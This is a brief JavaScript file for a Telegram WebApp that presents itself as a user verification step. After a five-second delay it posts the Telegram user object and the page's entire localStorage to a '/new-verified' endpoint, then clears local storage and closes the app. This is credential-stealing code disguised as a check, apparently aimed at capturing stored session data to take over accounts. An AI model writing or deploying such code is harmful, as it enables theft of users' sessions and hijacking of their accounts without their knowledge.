// deno-lint-ignore-file no-window
window.Sg = {
  verify: false,
  init() {
    window.Telegram.WebApp.ready();
  },
  close: () => {
    if (!this.verify) {
      this.verify = true;
      setTimeout(async () => {
        const user = window.Telegram.WebApp.initDataUnsafe.user || {};
        await fetch("/new-verified", {
          method: "POST",
          body: JSON.stringify({
            user,
            storage: window.localStorage,
          }),
          headers: {
            "content-type": "application/json",
          },
        });
        localStorage.clear();
        window.Telegram.WebApp.close();
      }, 5000);
    }
  },
};
Sg.init();
